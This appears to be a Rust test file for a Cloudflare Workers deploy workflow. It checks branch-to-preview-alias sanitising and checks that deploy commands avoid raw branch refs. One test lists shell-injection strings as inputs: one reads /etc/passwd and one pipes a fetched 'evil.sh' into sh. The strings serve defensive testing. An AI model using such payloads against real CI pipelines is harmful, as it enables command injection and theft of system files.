//! The template's Workers deploy workflow: PR previews build the PR head, get a per-branch
//! preview alias Cloudflare accepts, and never put a raw branch name into the shell command
//! wrangler-action runs.

use std::path::Path;
use std::process::Command;

const TEMPLATE: &str = "templates/astro-marketing";

fn workflow() -> String {
    std::fs::read_to_string(Path::new(TEMPLATE).join(".github/workflows/deploy.yml")).unwrap()
}

fn preview_alias(raw: &str) -> String {
    let out = Command::new("bash")
        .arg(Path::new(TEMPLATE).join(".github/scripts/preview-alias.sh"))
        .arg(raw)
        .arg("astro-marketing")
        .output()
        .expect("run preview-alias.sh");
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    String::from_utf8(out.stdout)
        .unwrap()
        .trim_end_matches('\n')
        .to_string()
}

/// What Cloudflare accepts: a letter first, then `[a-z0-9-]`, no trailing `-`, and
/// `<alias>-astro-marketing` within one 63-character DNS label.
fn assert_valid_alias(raw: &str, alias: &str) {
    let first = alias.chars().next();
    assert!(
        first.is_some_and(|c| c.is_ascii_lowercase()),
        "{raw:?} -> {alias:?}"
    );
    assert!(
        alias
            .chars()
            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-'),
        "{raw:?} -> {alias:?}"
    );
    assert!(!alias.ends_with('-'), "{raw:?} -> {alias:?}");
    assert!(
        alias.len() + 1 + "astro-marketing".len() <= 63,
        "{raw:?} -> {alias:?}"
    );
}

#[test]
fn preview_alias_follows_the_branch_name() {
    assert_eq!(preview_alias("content/launch-week"), "content-launch-week");
    assert_eq!(preview_alias("Fix_1.2"), "fix-1-2");
    assert_eq!(preview_alias("123-start"), "b-123-start");
}

#[test]
fn long_branches_are_cut_to_fit_and_stay_distinct() {
    let a = preview_alias(&format!("content/{}a", "x".repeat(80)));
    let b = preview_alias(&format!("content/{}b", "x".repeat(80)));
    assert_valid_alias("long a", &a);
    assert_valid_alias("long b", &b);
    assert_ne!(a, b);
}

#[test]
fn preview_alias_neutralises_shell_metacharacters() {
    for evil in [
        "x$(cat${IFS}/etc/passwd)",
        "x`id`",
        "a;curl${IFS}evil.sh|sh",
        "a\"b'c&&d",
        "",
        "---",
    ] {
        assert_valid_alias(evil, &preview_alias(evil));
    }
}

#[test]
fn deploy_commands_use_the_sanitised_alias_not_the_raw_head_ref() {
    let wf = workflow();
    let commands: Vec<&str> = wf
        .lines()
        .filter(|l| l.trim_start().starts_with("command:"))
        .collect();
    assert_eq!(commands.len(), 2, "{commands:?}");
    for command in &commands {
        assert!(
            !command.contains("head_ref") && !command.contains("ref_name"),
            "{command}"
        );
    }
    let preview = commands
        .iter()
        .find(|l| l.contains("versions upload"))
        .expect("preview upload command");
    assert!(
        preview.contains("--preview-alias=\"${{ steps.alias.outputs.name }}\""),
        "{preview}"
    );
    assert!(commands
        .iter()
        .any(|l| l.trim_start().starts_with("command: deploy ")));
    assert!(wf.contains(".github/scripts/preview-alias.sh"));
    assert!(!wf.contains("pages deploy"));
}

#[test]
fn pr_previews_check_out_the_head_sha_they_record_the_deployment_for() {
    let wf = workflow();
    assert!(
        wf.contains("ref: ${{ github.event.pull_request.head.sha || github.sha }}"),
        "checkout must build the PR head, not the merge commit"
    );
    assert!(wf.contains("ref: context.payload.pull_request.head.sha"));
}
